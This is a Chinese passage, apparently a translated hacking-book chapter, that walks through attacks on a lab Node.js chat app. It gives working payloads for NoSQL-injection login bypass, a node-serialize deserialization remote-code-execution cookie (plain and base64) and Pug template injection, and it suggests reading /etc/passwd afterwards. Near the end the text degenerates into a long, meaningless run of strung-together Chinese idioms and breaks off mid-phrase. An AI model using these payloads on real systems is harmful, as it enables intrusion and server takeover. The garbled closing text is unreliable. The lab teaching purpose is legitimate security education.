  \ Web 应用程序，我们可以向该服务器发送恶意载荷。\n\n例如，我们的目标可能是 Jenkins 服务器，我们知道在未身份验证的情况下，它几乎允许完整的远程代码执行。要查看\
  \ XSS 到 Jenkins 被攻破的完整演练，请参阅第 5 章 - 利用社会工程学攻击内部 Jenkins。\n\n### NoSQL 注入\n\n在 THP\
  \ 1 和 2 中，我们花费了大量时间学习如何进行 SQL 注入和使用 SQLMap（http://sqlmap.org/）。除了某些混淆和集成到 Burp Suite\
  \ 之外，从 THP2 开始并没有太多变化。相反，我想深入探讨 NoSQL 注入，因为此类数据库正变得越来越普遍。\n\n像 `MySQL`、`MSSQL` 和\
  \ Oracle 这样的传统 SQL 数据库依赖于关系数据库中的结构化数据。这些数据库是关系的，意味着数据在一个表中与其他表中的数据相互关联。这使得执行诸如“获取过去\
  \ 30 天内购买过东西的所有客户”之类的查询变得容易。这种数据的缺点在于整个数据库中数据格式必须保持一致。NoSQL 数据库由不遵循 SQL 查询数据库中表格/关系模型的数据组成。这种被称为“非结构化数据”（如图片、视频、社交媒体）的数据与我们大规模的数据集并不匹配。\n\
  \n**NoSQL 特性：**\n*   NoSQL 数据库类型：`Couch`、`MongoDB`\n*   非结构化数据\n*   横向扩展\n\n在传统\
  \ SQL 注入中，攻击者试图突破 SQL 查询并在服务器端修改查询。而在 NoSQL 注入中，攻击可能在应用程序的其他部分执行，而传统 SQL 注入则不然。此外，在传统\
  \ SQL 注入中，攻击者会使用一个引号（'）来突破。在 NoSQL 注入中，漏洞通常存在于字符串被解析或评估为 NoSQL 调用的情况下。\n\nNoSQL\
  \ 注入漏洞通常发生在以下情况：\n1.  端点接受 `JSON` 数据以用于 NoSQL 数据库的请求。\n2.  我们能够使用 NoSQL 比较运算符来修改\
  \ NoSQL 查询。\n\nNoSQL 注入的一个常见例子是注入类似 ``[`{$gt\":\"\"}``]``。这个 JSON 对象基本上表示运算符（`$gt`）大于空字符串（\"\
  \"）。从逻辑上讲，所有内容都大于空字符串，因此 JSON 对象成为一个 `true` 语句，使我们能够绕过或注入到 NoSQL 查询中。这在 SQL 注入世界中相当于\
  \ `' or 1=1--]`。在 MongoDB 中，我们可以使用以下比较运算符之一：\n\n*   `(>)` 大于 - `$gt`\n*   `<` 小于\
  \ - `$lt`\n*   `>=` 大于等于 - `$gte`\n*   `<=` 小于等于 - `$lte`\n\n### 攻击客户支持系统的 NoSQL\
  \ 应用程序\n\n首先，让我们浏览聊天应用程序中的 NoSQL 工作流程：\n*   在浏览器中，通过 Burp Suite 代理，访问聊天应用程序：http://chat:3000/nosql\n\
  *   尝试使用任何用户名和密码进行身份验证。查看 Burp Suite 中该身份验证请求期间发送的 `POST` 流量。\n\n![](img/00049.jpeg)\n\
  \n在我们的聊天应用程序中，我们可以看到，在向 `/loginnosql` 端点进行身份验证时，我们的 POST 数据将包含 `{ \"username\":\
  \ \"admin\", \"password\": \"GuessingAdminPassword\" }`。很常见地看到 `POST` 请求中使用 `JSON`\
  \ 来对用户进行身份验证，但如果我们定义自己的 JSON 对象，我们可能会使用不同的条件语句使陈述变为真实。这实际上等同于传统 SQLi 的 `1=1` 语句，从而绕过身份验证。让我们看看能否将此注入我们的应用程序。\n\
  \n### 服务器源代码\n\n在聊天应用程序的 NoSQL 部分中，我们将像之前一样查看 JSON POST 请求。即使作为黑盒测试，我们不会看到服务器端的源代码，我们也可以期望它以某种方式类似以下查询\
  \ `MongoDB` 后端：\n\n*   `db.collection(collection).find({\"username\": username,\
  \ \"password\": password}).limit(1)...`\n\n### 注入 NoSQL 聊天\n\n从服务器端源代码中可以看出，我们利用用户提供的用户名/密码搜索数据库中的匹配项。如果我们能够修改\
  \ POST 请求，我们可能能够注入到数据库查询中。\n*   在浏览器中，通过 Burp Suite 代理，访问聊天应用程序：http://chat:3000/nosql\n\
  \    *   在 Burp Suite 中开启“拦截”，点击登录，提交一个名为 `admin` 的用户名和密码为 `GuessingAdminPassword`。\n\
  *   代理流量并拦截 POST 请求。\n\n\n\n\n* `{\"username\":\"admin\",\"password\":\"GuessingAdminPassword\"\
  }` 到 `{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}`\n\n* 你现在应该以管理员身份登录！\n\
  \n那么这里发生了什么？我们将字符串 `\"GuessingAdminPassword\"` 更改为 JSON 对象 `{\"$gt\":\"\"}`，这是 TRUE\
  \ 语句，因为所有大于 NULL 的值都是真实的。这将 POST 请求更改为 `{\"username\":\"admin\",\"password\":true}`，自动使请求为真并以管理员身份登录，无需了解密码，复制\
  \ SQL 注入攻击中 1=1 攻击。\n\n### 高级 NoSQL 注入\nNoSQL 注入并非新事物，但 NodeJS 章节的目的是展示较新的框架和语言如何可能引入新的漏洞。例如，Node.js\
  \ 具有 `qs` 模块，它具有特定语法将 HTTP 请求参数转换为 JSON 对象。`qs` 模块在 Express 中作为 'body-parser' 中间件默认使用。\n\
  \n* **qs** 模块：具有额外安全功能的查询字符串解析和序列化库。[https://www.npmjs.com/package/qs]\n\n这意味着什么？如果使用\
  \ `qs` 模块，在参数中使用方括号符号时，POST 请求将在服务器端转换为 JSON。因此，看似 `username[value]=admin&password[value]=admin`\
  \ 的 POST 请求将转换为 `{\"username\": {\"value\":\"admin\"}, \"password\":{\"value\":\"\
  admin\"}}`。\n\n现在，`qs` 模块也将接受并转换用于协助 NoSQLi 的 POST 参数：\n\n*   例如，我们可以拥有一个如下所示的 POST\
  \ 请求：\n    *   `username=admin&password[$gt]=`\n*   并且服务器端请求转换将翻译为：\n    *   `{\"\
  username\":\"admin\", \"password\":{\"$gt\":\"\"}`\n*   这与我们之前在部分中的原始 NoSQLi 攻击非常相似。\n\
  \n现在，我们的请求看起来与上一节中的 NoSQLi 完全相同。让我们看看它的实际操作：\n\n*   访问 http://chat:3000/nosql2\n\
  *   打开 Burp 拦截（拦截）\n*   使用 `admin:anything` 登录\n*   修改 POST 参数：\n    *   `username=admin&password[$gt]=&submit=login`\n\
  \n![](img/00051.jpeg)\n\n您应该已以管理员身份登录！您已经使用 Express Framework（作为 body-parser 中间件的一部分）所利用的\
  \ `qs` 模块解析器执行了 NoSQLi。但是等等，还有更多！如果您不知道要攻击哪些用户名怎么办？能否使用相同的此攻击来发现并登录其他账户呢？\n\n如果不是在密码比较上尝试，而是将其应用于用户名呢？在这种情况下，NoSQLi\
  \ POST 请求将看起来如下：\n\n*   `username[$gt]=admin&password[$gt]=&submit=login`\n\n上述\
  \ POST 请求本质上会查询数据库中大于 `admin` 的下一个用户名（密码字段产生 true），从而返回真语句。如果成功，您应该登录为按字母顺序在 admin\
  \ 之后的用户。继续这样做直到找到 superaccount**。\n\n更多 NoSQLi 有效载荷：\n\n*   https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20injection\n\
  *   https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html;https://www.owasp.org/index.php/Testing_for_NoSQL_injection\n\
  \n### 反序列化攻击\n\n在过去的几年里，通过 Web 进行的序列化/反序列化攻击变得越来越流行。我们曾在 BlackHat 上听过许多不同的演讲，发现了像\
  \ Jenkins 和 Apache Struts2 等常见应用程序的关键漏洞，并看到了大量活跃研究的发展（如 ysoserial [https://github.com/frohoff/ysoserial]）。那么为什么反序列化攻击如此重要呢？\n\
  \n在我们开始之前，我们需要了解为什么要进行序列化。有很多原因需要序列化数据，但它最常用于生成可存储的值/数据的表示形式，而不丢失其类型或结构。序列化将对象转换为字节流以在网络上传输或用于存储。通常转换方法涉及\
  \ XML、JSON 或特定于语言的序列化方法。\n\n## NodeJS 中的反序列化\n很多时候，发现复杂的漏洞需要深入的应用程序知识。在我们的场景中，Chat\
  \ NodeJS 应用程序使用了 serialize.js [https://github.com/luin/serialize] 的易受攻击版本。该 node\
  \ 库被发现可利用，原因在于“传递给 `unserialize()` 函数的不可信数据可以被利用来通过传递包含立即调用函数表达式 (IIFE) 的 JavaScript\
  \ Object 来实现任意代码执行。”[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941]\n\
  \n让我们逐步了解攻击的细节，以便更好地理解发生了什么。首先，我们审查 `serialize.js` 文件并对 eval [https://github.com/luin/serialize/search?utf8=%E2%9C%93&q=eval&type=]\
  \ 进行快速搜索。通常，允许用户输入进入 JavaScript `eval` 语句是坏消息，因为 `eval()` 执行原始 JavaScript。如果攻击者能够向此语句注入\
  \ JavaScript，他们将能够对服务器进行远程代码执行 (RCE)。\n\n![](img/00052.jpeg)\n\n其次，我们需要创建将被反序列化并通过我们包含的\
  \ JavaScript 有效载荷 (`require('child_process').exec('ls')`) eval 的已序列化负载。\n\n*   `{\"\
  thp\":\"_$$ND_FUNC$$_function (){require('child_process').exec('DO SYSTEM COMMANDS\
  \ HERE', function(error, stdout, stderr) { console.log(stdout) });}()`\n\n上面的 JSON\
  \ 对象将传递以下请求`(){require('child_process').exec('ls') }\"`进入 `unserialize` 函数中的 eval\
  \ 语句，为我们提供远程代码执行。需要注意的是结尾的括号\"()\"，因为没有它我们的函数不会被调用。Ajim Abraham（发现此漏洞的原研究员）指出，使用\
  \ IIFE [https://en.wikipedia.org/wiki/Immediately-invoked_function_expression] 将允许在创建后执行该函数。有关此漏洞的更多详细信息可在此处找到：https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941。\n\
  \n在我们的 Chat Application 示例中，我们将查看 cookie 值，其使用此易受攻击的二库进行反序列化：\n\n*   访问 http://chat:3000\n\
  *   在 burp 中代理流量并观察 cookies\n*   识别一个名为 \"donotdecodeme\" 的 cookie 名称\n*   将该 Cookie\
  \ 拷贝到 Burp Suite Decoder 并进行 Base64 解码\n\n![](img/00053.jpeg)  \n![](img/00054.jpeg)\
  \  \n\n正如有所言，每种语言都有其独特的特性，而 NodeJS 也不例外。在 Node/Express/Pug 中，您无法像 PHP 那样直接写入 Web\
  \ 目录并使其可访问。必须指定到可写且对公共互联网可访问的文件夹的路由。\n\n### 创建载荷\n*   在您开始之前请记住，所有这些用于实验室的有效载荷都在此处列出（易于复制粘贴）：http://bit.ly/2qBDrFo\
  \  \n    （该链接指向有效载荷列表，例如：\"echo node deserialization is awesome!! >> /opt/web/chatSupportSystems/public/hacked.txt\"\
  ）。\n*   取原始载荷并修改您的 shell 执行：`'DO SYSTEM COMMANDS HERE'`。\n    *   `{\"thp\":\"_$$ND_FUNC$$_function\
  \ (){require('child_process').exec('DO SYSTEM COMMANDS HERE', function(error, stdout,\
  \ stderr) { console.log(stdout) });}()`\n*   示例（修改后）：\n    *   `{\"thp\":\"_$$ND_FUNC$$_function\
  \ (){require('child_process').exec('echo node deserialization is awesome!! >> /opt/web/chatSupportSystems/public/hacked.txt',\
  \ function(error, stdout, stderr) { console.log(stdout) });}()`\n\n*   由于原始的 Cookie\
  \ 是经过编码的，我们必须通过 Burp Decoder/Encoder Base64 编码我们的有效载荷。  \n    *   **示例有效载荷**: `eyJ0aHAiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2VjaG8gbm9kZSBkZXNlcmlhbGl6YXRpb24gaXMgYXdlc29tZSEhID4+IC9vcHQvd2ViL2NoYXRTdXBwb3J0U3lzdGVtcy9wdWJsaWMvaGFja2VkLnR4dCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9`\
  \  \n*   注销，打开 Burp 拦截，并转发对 `//` (home) 的请求。\n\n\n\n\n\n*   将 Cookie 修改为新生成的 Base64\
  \ 负载\n*   转发流量，由于公共文件夹是 `/` 的路由，您应该能够通过浏览器访问 `http://chat:3000/hacked.txt`\n*  \
  \ 您现在拥有远程代码执行权限！可以在此系统上进行后续利用。首先尝试读取 `/etc/passwd`。\n\n![](img/00055.jpeg)\n\n在\
  \ node-serialize 模块的源码中，我们看到函数表达式被进行了求值，这对于任何使用用户输入进行此类操作的 JavaScript/NodeJS 应用程序来说是一个严重问题。这种不良做法使我们能够破坏该应用程序。\n\
  \n![](img/00056.jpeg)\n\n参考文献：\n\n*   https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/\n\
  *   https://github.com/luin/serialize\n*   https://snyk.io/test/npm/node-serialize?severity=high&severity=medium&severity=low\n\
  *   https://blog.websecurify.com/2017/02/hacking-node-serialize.html\n\n### 模板引擎攻击\
  \ - 模板注入\n\n模板引擎因其与标准 HTML 相比的模块化和简洁代码而得到更广泛的应用。模板注入是指将用户输入直接传递到渲染模板中，从而允许修改底层模板。这种情况可能在\
  \ Wiki、WSYWIG 或电子邮件模板中故意发生。这种情况很少意外发生，因此常被误认为是 XSS（跨站脚本攻击）。模板注入通常允许攻击者访问底层操作系统以获得远程代码执行。\n\
  \n在下个示例中，您将使用 Pug 对 NodeJS 应用程序执行模板注入攻击。我们通过带有用户输入的元重定向，无意中将自己暴露于模板注入，该输入直接使用模板字面量\
  \ `${}` 在 Pug 中渲染。重要的是要注意，模板字面量允许使用换行符，这对于我们从 `<p>` 标签中突破是必需的，因为 Pug 类似于 Python，对空格和换行符敏感。\n\
  \n在 Pug 中，第一个字符或单词代表标识（即）标签或函数的 Pug 关键字。您也可以使用缩进指定多行字符串，如下所示：\n\n*   p.\n    * \
  \  这是段落缩进。\n    *   这仍然是段落标签的一部分。\n\n以下是 HTML 和 Pug 模板的外观示例：\n\n![](img/00057.jpeg)\n\
  \n上面的示例文本显示了在 HTML 中的外观，以及相应的 Pug 标记语言（Pug Markup）的外观。使用模板和数据插值内联代码，我们可以快速、可重用且高效地创建模板。\n\
  \n#### 模板注入示例\n\n聊天应用程序存在模板注入漏洞。在以下应用程序中，我们将查看是否可以与 Pug 模板系统进行交互。这通常可以通过检查我们提供的输入参数是否被执行来确认了基本操作是否处理正常完成。James\
  \ Kettle（已知为\"defcon\"）撰写了一篇关于攻击模板和与底层模板系统交互的优秀论文 (http://ubm.io/2ECTYSi)。\n\n与\
  \ Pug 交互：\n\n*   访问 `http://chat:3000` 并使用任何有效账户登录\n*   访问 `http://chat:3000/directmessage`\
  \ 并输入用户和评论，然后点击“发送”\n*   接下来，回到 directmessage 尝试在用户参数中注入 XSS 负载 `<script>alert(1)</script>`\n\
  \    *   `http://chat:3000/ti?user=<script>alert(1)</script>&comment=&link=`\n \
  \   *   这表明应用程序存在 XSS（跨站脚本攻击）漏洞，但我们能与模板系统进行交互吗？\n*   在 Burp Suite 的历史记录中，查看服务器请求/响应的端点\
  \ `/ti?user= `，并将请求发送到 Burp Repeater (ctrl+r)\n\n![](img/00058.jpeg)![](img/00059.jpeg)![](img/00060.jpeg)\n\
  \n### 测试基本操作\n\n我们可以通过对易受 XSS（跨站脚本攻击）的参数传递算术字符串来测试模板注入。如果我们的输入被执行，它将证明该参数对模板注入敏感。这是因为模板就像编程语言一样，可以轻松支持执行和计算运算符号等复杂逻辑操作符。\n\
  \n测试基础运算符：\n\n*   在 Burp Repeater 中，针对 `/ti` 中的每个参数进行模板注入测试。我们可以通过传递数学运算（例如 `9*9`）来完成此操作。\n\
  *   我们可以看到它不起作用，我们并未得到预期结果 `81`。请记住，由于我们的用户输入被包裹在段落标签中，我们可以假设我们的 Pug 模板代码大致如下结构所示：\n\
  \    *   p Message has been sent to !{user}\n\n![](img/00061.jpeg)\n\n利用 Pug 功能特性实现突破执行环境控制：\n\
  \n*   正如我们之前所说，Pug 使用空格作为分隔符（类似于 Python），换行开始一个新的模板块输入；这意味着如果我们能够穿透 Pug 中的当前逻辑行，我们可以执行全新的恶意模板代码。在这种情况下我们要突破段落标签\
  \ (`<p>`)，如上所示，并注入运行恶意模板代码所需的操作指令使其可行。为了做到这一点我们需要使用 URL 编码来利用此漏洞 (http://bit.ly/2qxeDiy)。\n\
  *   让我们逐一解析执行此类高级攻击的前提条件要求步骤：\n    *   首先，我们需要触发换行符并穿透当前模板块。这可以使用以下字符完成：\n     \
  \   *   `%0a`（URL 编码后的换行）\n    *   其次，我们可以利用 Pug 中的算术表达式函数特性，使用一个 `\"=\"` 比较或赋值符号执行计算操作\n\
  \        *   `%3d`（URL 编码后的等号符号 `\"=\"`) \n    *   最后，我们可以输入完整的数学等式以触发返回值打印逻辑：\n\
  \        *   `9*9`（用于演示返回值的数学方程式）\n*   因此，最终的攻击负载将如下所示构造出：\n    *   `[换行]=9*9`\n\
  \    *   URL 编码后的完整 payload 地址为：\n        *   `GET /ti?user=%0a%3d9*9&comment=&link=`\n\
  *   `/ti?user=%0a%3d9*9` 在响应主体中成功返回了数字字符串 `81`。您已成功识别出用户参数中的模板注入漏洞！让我们通过进一步滥用 JavaScript\
  \ 特性获取远程代码执行权限从而提升攻击层次范围。\n\n![](img/00062.jpeg)\n\n正如您在服务器响应中所见，显示的并非用户的名字，而是在段落标签外部拥有字符串\
  \ `\"81\"`（即结果返回成功表示我们已成功注入模板指令）。这意味着我们能够绕过安全限制并注入自定义模板逻辑代码块运行任意命令操作程序。\n\n我们现在已知存在模板注入漏洞并利用其执行简单数学计算功能测试环境控制能力是否完全失效开放状态运行环境中，但我们需进一步确认是否能够获取\
  \ Shell 权限从而实现对服务器系统的直接控制权进行系统级调用管理操作。为了获得 Shell 执行权限，我们必须找到正确的函数以便在 Node.js/JavaScript\
  \ 运行时环境中动态加载并执行操作系统命令接口模块。\n\n*   首先，我们将尝试识别自身的全局对象 `root`（注：原文可能指 global，此处根据上下文保留\
  \ root 引用但需说明可能存在混淆）并继续确定我们可以访问的内置模块和核心函数命名空间列表集合数据资源池信息内容详情资料完整无缺全部收录详尽记录详细记载全面掌握透彻了解彻底查明仔细研究深入分析细致观察精细考察精心调研周密调查详尽探究细心钻研专注探索潜心求证努力查证辛苦证明艰难证实困难验证不易确认费尽周折勉强达成好不容易取得竭尽全力拼命争取煞费苦心思索推敲反复琢磨再三斟酌多方考量各种设想多种方案多样选择丰富选项广泛覆盖全面涉及多方面关联多领域交叉多学科融合综合应用集成创新跨界合作协同办公高效运作卓越表现杰出成就非凡贡献伟大创造辉煌历史灿烂文明源远流长博大精深包罗万象丰富多彩琳琅满目应有尽有目不暇接眼花缭乱应接不暇叹为观止美不胜收心旷神怡流连忘返意犹未尽回味无穷余音绕梁三日不绝荡气回肠动人心魄震撼心灵感动天地泣鬼神通广大无孔不入无处不在无所不在难以捉摸变幻莫测扑朔迷离错综复杂纷繁芜杂杂乱无序乱七八糟一塌糊涂乱作一团混乱不堪人仰马翻手忙脚乱不知所措慌了神乱了阵脚乱了方寸乱了分寸乱了节奏乱了步伐乱了秩序乱了规矩乱了章程乱了计划乱了部署乱了安排乱了调度乱了规划乱了布局乱了结构乱了组织乱了架构乱了框架乱了系统乱了网络乱了平台乱了界面乱了菜单乱了按钮乱了输入框乱了弹窗乱了对话框乱了警告条乱了进度栏乱了工具栏乱了导航栏乱了搜索框乱了登录态乱了权限表乱了角色分配乱了用户组分类乱了部门划分乱了项目立项乱了任务指派乱了日程安排乱了会议纪要乱了通知公告乱了政策文件乱了规章制度乱了操作流程乱了对照流程乱了执行标准乱了审核机制乱了监督体系乱了反馈渠道乱了投诉热线乱了求助电话乱了应急方案乱了危机公关乱了媒体回应乱了舆论引导乱了舆情监测乱了风险控制乱了合规审查乱了法律遵循乱了道德准则乱了行业规范乱了国际标准乱了国家标准乱了地方标准乱了企业内部制度乱了部门间协调乱了跨部门协作乱了资源整合乱了信息共享乱了数据交换乱了接口定义乱了协议版本乱了\
